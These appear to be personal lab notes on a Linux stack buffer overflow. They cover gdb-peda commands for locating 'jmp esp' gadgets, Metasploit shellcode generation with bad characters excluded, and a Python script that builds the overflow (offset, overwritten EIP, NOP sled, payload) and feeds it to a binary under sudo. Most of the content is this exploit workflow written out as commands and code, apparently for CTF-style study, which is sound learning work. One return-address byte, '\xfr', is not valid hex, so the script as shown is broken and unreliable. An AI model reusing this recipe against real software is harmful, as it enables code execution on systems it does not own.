Exploit code AKA shellcode will be written in bytecode (from metasploit)

Tools
- IDA, GHIDRA
- GNU DeBugger (GDB), MONA & PETA - weaponinzing the debugger (extensions), IMMUNITY (for Windows)
- BASH & PYTHON

$gdb-peda
gdb-peda$ pdisas main
gdb-peda$ pdisas get getuserinputs

env - gdb func
show env #stll environment variables set
unset env LINES
unset ENV COLUMNS
show env
run
info proc map
find /b (start addy after heap), (end addy before stack), 0xff (jmp), 0xe4 (esp)    #search for jmp esp 
#take the first 3 addresses --> into python script

msfconsole
use payload linux/x86/exec
#inline payload works, stager requires a special listener
set CMD whoami
generate -b "\x00\x20\x0a\x0d" -f python

offset = "a" *62
#eip = "BBBB"
eip = '\x59\x3b\xfr\xf7'
#from the reference address below, last, 3rd, sec,first
#0xf7de3b59
#Addy1
#Addy2
#Addy3
nop = '\x90' * 10 #creates a pause to line up the execution, will be a trial and error in the real world
buf = b""
print(offset+eip+nop+buf)

sudo ./func <<< $(python ./expdemo.py)

CTFd -> windows buffer overflow
--> medium article
